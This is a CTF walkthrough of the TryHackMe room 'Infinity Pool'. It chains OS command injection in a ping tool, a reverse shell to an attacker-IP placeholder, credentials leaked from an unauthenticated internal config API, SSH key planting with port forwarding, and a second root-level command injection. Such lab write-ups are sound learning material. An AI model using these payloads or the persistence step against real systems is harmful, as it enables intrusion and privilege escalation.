# TryHackMe: Infinity Pool — Walkthrough

**Room:** Infinity Pool (Hacker Holidays — Day 11, The Byte Lotus Hotel)
**Category:** Boot2Root
**Difficulty:** Medium

No visible edge. You trace the network to the horizon and find three systems nobody told you about on the other side.

---

## 1. Reading the Room Briefing First

> "Byte Lotus Hotel promises a seamless stay powered by modern technology. Sometimes the most interesting systems are the ones guests were never meant to see."

Combined with the room title and the "three systems nobody told you about on the other side" framing, this pointed toward internal service discovery and pivoting — the public-facing app is a gateway to something more interesting sitting behind it, not the whole story on its own.

## 2. Recon

```bash
nmap -sV -sC -p22,80 <TARGET_IP>
```

```
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu
80/tcp open  http    Gunicorn
|_http-title: Byte Lotus — Stay Noticed
| http-robots.txt: 2 disallowed entries
|_/internal/ /status
```

Gunicorn again — Python/Flask. `robots.txt` disallowing `/internal/` and `/status` is a direct pointer (Disallow entries don't block *us*, just well-behaved crawlers).

## 3. The Comment That Explains Everything

The site's `app.js` contains a developer TODO comment left in production:

```javascript
// Byte Lotus front-end bootstrap.
// TODO(ops): the staff connectivity tool at /status posts to the legacy
// /internal/netcheck handler. Keep it out of the public nav until the new
// auth gateway ships. Disallowed in robots.txt for now.
console.log("Stay Noticed™");
```

This tells us exactly what `/status` does before we even look at it: it's a "staff connectivity tool" posting to `/internal/netcheck`.

```bash
curl -s http://<TARGET_IP>/status
```

```html
<form method="post" action="/internal/netcheck" class="tool">
  <input type="text" name="host" value="" placeholder="property host e.g. 10.0.0.5" autofocus>
  <button type="submit">Check</button>
</form>
```

A "confirm a remote property responds" tool that takes a host and pings it — a classic shape for either SSRF or, if implemented carelessly, OS command injection.

## 4. From Ping Tool to Command Injection

```bash
curl -s -X POST http://<TARGET_IP>/internal/netcheck -d "host=127.0.0.1"
```

The response includes real `ping` command output — `PING 127.0.0.1 ... 64 bytes from 127.0.0.1 ...` — confirming the server is genuinely shelling out to the system `ping` binary rather than doing anything programmatic. That's worth testing for injection immediately:

```bash
curl -s -X POST http://<TARGET_IP>/internal/netcheck -d "host=127.0.0.1; id"
```

The response appended real command output:
```
uid=1001(web) gid=1001(web) groups=1001(web)
```

Confirmed OS command injection — the `host` parameter is concatenated directly into a shell command (`ping -c 1 {host}` under `shell=True`, as the source later confirmed) with no sanitization at all.

## 5. Reverse Shell and User Flag

```bash
nc -lvnp 4444
```
```bash
curl -s -X POST http://<TARGET_IP>/internal/netcheck \
  --data-urlencode 'host=127.0.0.1; bash -c "bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1"'
```

Shell lands as `web`:
```bash
find / -iname "*user.txt*" 2>/dev/null
cat /home/web/user.txt
```

Flag retrieved. `sudo -l` requires a password we don't have, and `/home/ubuntu`'s files (`.bash_history`, `.Xauthority`) are permission-denied — no easy lateral move there. Reading the app's own source confirms the injection precisely:

```python
@app.route("/internal/netcheck", methods=["POST"])
def netcheck():
    host = request.form.get("host", "").strip()
    ...
    proc = subprocess.run(f"ping -c 1 {host}", shell=True, capture_output=True, text=True, timeout=15)
```

## 6. Mapping "The Three Systems"

`ss -tulnp` (loopback listeners only, no process names) showed several unlabeled internal ports beyond the public app on :80:
```
127.0.0.1:9000
127.0.0.1:5038   (matches Asterisk AMI's default port)
127.0.0.1:3000
127.0.0.1:8080
127.0.0.1:8088
127.0.0.1:8089
127.0.0.1:3306   (MySQL/MariaDB)
```

`ss` alone doesn't attach process names to loopback sockets here — `ps aux` is what actually ties ports to services:

```bash
ps aux | grep -iE "gunicorn|python"
```

```
web    /var/www/infinity_pool/edge/venv/...       gunicorn --bind 0.0.0.0:80    (edge, public, runs as web)
root   /var/www/infinity_pool/automation/venv/...  gunicorn --bind 127.0.0.1:9000 (automation, runs as root)
svc-watchtower /var/www/infinity_pool/watchtower/venv/... gunicorn --bind 127.0.0.1:3000 (watchtower, runs as svc-watchtower)
```

There they are — **three separate Flask apps, three separate users**, exactly matching "three systems nobody told you about." `edge` is the box we're already on; `automation` runs as **root** and is our real target; `watchtower` sits in between. (Ports 8080/8088/8089 turned out later to be Apache/FreePBX and Asterisk's HTTP/ARI interfaces — not obvious from `ps aux` alone at this stage, only confirmed once UCP was reached directly.)

`/etc/systemd/system/cc-automation.service` confirms the root ownership explicitly:
```ini
[Unit]
Description=Closed Circuit - Automation job runner (loopback, root)

[Service]
User=root
Group=root
WorkingDirectory=/var/www/infinity_pool/automation
EnvironmentFile=/var/www/infinity_pool/automation/automation.env
ExecStart=.../gunicorn --workers 1 --bind 127.0.0.1:9000 wsgi:app
```

`automation.env` itself is unreadable as `web` — whatever `automation` needs for auth has to be found somewhere else.

## 7. Watchtower Leaks the Next Layer

```bash
curl -s http://127.0.0.1:3000/
```
```
Watchtower — ops console
"Loopback-only console. Authenticated by network position."
Service endpoints: /api/health · /api/config
```

**"Authenticated by network position"** is a direct admission: this service trusts anything originating from `127.0.0.1`, no credentials required.

```bash
curl -s http://127.0.0.1:3000/api/config
```

```json
{
  "automation_endpoint": "http://127.0.0.1:9000",
  "note": "internal network only -- do not expose",
  "ops_note": "UCP still on default template creds (FreePBXUCPTemplateCreator) -- ROTATE.",
  "telephony_pass": "St4yN0t1c3d_2026",
  "telephony_portal": "http://127.0.0.1:8080/ucp",
  "telephony_user": "FreePBXUCPTemplateCreator"
}
```

This single response hands us a fourth internal service (FreePBX UCP on :8080) plus its credentials, and confirms `automation`'s endpoint at :9000.

```bash
curl -s http://127.0.0.1:9000/health
```
```json
{
  "endpoints": {
    "GET /health": "service status",
    "POST /jobs/export": {
      "auth": "Authorization: Bearer <automation key>",
      "body": {"report": "<report name>"},
      "desc": "archive the latest data export"
    }
  },
  "runs_as": "root", "service": "automation", "status": "ok"
}
```

`automation` tells us exactly what it needs — a Bearer token we don't have yet — and confirms it runs as root. That token is the missing piece standing between us and root.

**Dead end worth noting:** the leaked UCP credentials were tried directly against Asterisk's AMI on port 5038 (same box, same telephony theme), on the chance of credential reuse:
```bash
timeout 5 bash -c '(echo -e "Action: Login\r\nUsername: FreePBXUCPTemplateCreator\r\nSecret: St4yN0t1c3d_2026\r\n\r\n"; sleep 2) | nc 127.0.0.1 5038'
```
```
Response: Error
Message: Authentication failed
```
Wrong service — AMI and UCP don't share the same credential store. Worth ruling out quickly rather than assuming, since "same box, same password" is a common enough pattern that it's cheap to check.

## 8. The UCP Login Dead End — and the Fix

The first real friction point of the room: scripting the UCP login with `curl` — fetching the CSRF token from the login form, then POSTing `token`/`username`/`password` back — technically returned `HTTP 200` every time, but never actually authenticated. The response kept re-rendering an empty, unused login form regardless of exactly which field names, POST target (`?display=login` vs `?display=dashboard`), or headers (`X-Requested-With: XMLHttpRequest`) were tried.

The underlying reason: FreePBX's UCP login is **driven by client-side JavaScript/AJAX behavior** that a raw sequential `curl` POST doesn't faithfully reproduce — the real request the browser sends may depend on JS-computed state that isn't visible or reconstructible from the static HTML alone.

Rather than keep reverse-engineering the JS, the efficient fix was to stop fighting curl and just get a real browser talking to the internal port instead — using write access we already had as `web`:

```bash
echo 'ssh-ed25519 AAAA...<your pubkey>... kali@kali' >> ~/.ssh/authorized_keys
```
```bash
ssh -L 8080:127.0.0.1:8080 web@<TARGET_IP>
```

Then simply browsing to `http://127.0.0.1:8080/ucp/` on the attacker machine and logging in with `FreePBXUCPTemplateCreator` / `St4yN0t1c3d_2026` through an actual browser worked immediately — no further troubleshooting needed. **Lesson worth keeping:** when a login flow is heavily JS/AJAX-driven and scripted attempts keep silently failing without a clear error, forwarding the port and using a real browser is often faster than fully reverse-engineering the client-side logic.

## 9. Finding the Automation Key — Hidden in a Voicemail Caller ID

Inside UCP as `FreePBXUCPTemplateCreator`, adding a dashboard tab with a **Voicemail widget** for that mailbox surfaced a single voicemail entry whose **Caller ID field** had been used to smuggle a secret:

```
Voicemail entry — Tue, Jun 30, 2026 9:31 AM
CID: "Automation Key cc_auto_7b3f9a1c4e0d2f6a" <9000>
```

Extension `9000` lining up exactly with `automation`'s port is the confirmation this isn't coincidental — some internal process templated the automation Bearer key directly into a CID name field for calls involving that extension, and that field is visible to anyone with UCP voicemail access. A nice, literal payoff for a hotel-surveillance-themed room: the secret was recorded and logged, in a field nobody expected to double as a secrets store — very on-brand for "Byte Lotus never forgets."

## 10. Root via a Second Command Injection

With the key in hand, `/jobs/export` turned out to share the exact same underlying flaw as `edge`'s `/internal/netcheck` — the `report` field is built into a shell command (`tar czf /var/automation/exports/<report>.tgz /var/automation/data ...`) without sanitization, and this one runs as **root**.

```bash
curl -s -X POST http://127.0.0.1:9000/jobs/export \
  -H "Authorization: Bearer cc_auto_7b3f9a1c4e0d2f6a" \
  -H "Content-Type: application/json" \
  -d '{"report":"x.tgz /var/automation/data; id #"}'
```

```json
{
  "command": "tar czf /var/automation/exports/x.tgz /var/automation/data; id #.tgz /var/automation/data 2>&1",
  "output": "uid=0(root) gid=0(root) groups=0(root)\ntar: Removing leading `/' from member names\n"
}
```

Breaking out with `;` and neutralizing the rest of the original command with `#` (a shell comment) gives clean root command execution. Reading the flag directly:

```bash
curl -s -X POST http://127.0.0.1:9000/jobs/export \
  -H "Authorization: Bearer cc_auto_7b3f9a1c4e0d2f6a" \
  -H "Content-Type: application/json" \
  -d '{"report":"x.tgz /var/automation/data; cat /root/root.txt #"}'
```

Flag retrieved directly in the JSON response — no shell needed for the final step at all.

---

## Summary of the Chain

| Stage | Technique | Result |
|---|---|---|
| Recon | `robots.txt` + a leftover TODO comment in `app.js` | Found `/status` → `/internal/netcheck`, a staff "ping" tool |
| Foothold | OS command injection in the `host` parameter (`shell=True`, no sanitization) | Reverse shell as `web` → user flag |
| Internal mapping | `ss -tulnp` showed unlabeled loopback ports; `ps aux` tied them to three separate apps/users | Identified `edge` (web), `watchtower` (svc-watchtower, :3000), `automation` (**root**, :9000) |
| Credential leak | `watchtower`'s `/api/config`, reachable with zero auth ("authenticated by network position") | Leaked FreePBX UCP credentials + confirmed `automation`'s Bearer-auth endpoint shape |
| Dead end (checked, ruled out) | Tried UCP creds against Asterisk AMI (:5038) | Wrong service — no credential reuse here |
| Dead end → fix | Scripted `curl` logins against UCP's AJAX-driven login form | Never authenticated; fixed by adding an SSH key and port-forwarding :8080 to a real browser |
| Key discovery | UCP dashboard → Voicemail widget → Caller ID field on an extension-9000 voicemail | Automation service's Bearer token, leaked via CID templating |
| Root | Second command injection, this time in `automation`'s `/jobs/export` `report` field, running as root | Root command execution → root flag |

**Key takeaway:** this room is really about *not stopping at the first wall*. The public app's injection bug gets you a foothold, but the real prize is three steps removed from it, gated behind a service that only trusts "network position" (an internal-only assumption that falls apart the moment you have any shell on the box), a login flow not worth reverse-engineering when a port-forward and a real browser solve it faster, and a secret hidden somewhere genuinely unexpected — a phone system's caller ID field. Reading each service's own self-description (`/api/health`, `/api/config`, the systemd unit file) did more to move the chain forward than blind scanning at every stage.

*(Flag intentionally omitted from this writeup — run the exploit yourself against your own instance to retrieve it.)*
